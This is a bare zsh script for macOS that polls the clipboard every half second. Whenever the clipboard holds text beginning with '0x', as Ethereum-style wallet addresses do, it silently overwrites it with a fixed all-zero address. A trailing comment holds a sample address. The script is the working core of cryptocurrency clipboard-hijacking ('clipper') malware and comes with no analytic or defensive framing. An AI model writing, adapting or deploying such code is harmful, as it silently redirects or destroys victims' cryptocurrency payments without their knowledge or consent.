#!/bin/zsh
while true; do
  a=$(pbpaste)
  if [[ $a == 0x* ]]; then printf "%s" "0x0000000000000000000000000000000000000000" | pbcopy; fi
  sleep 0.5
done
# 0x1234567890abcdef1234567890abcdef12345678
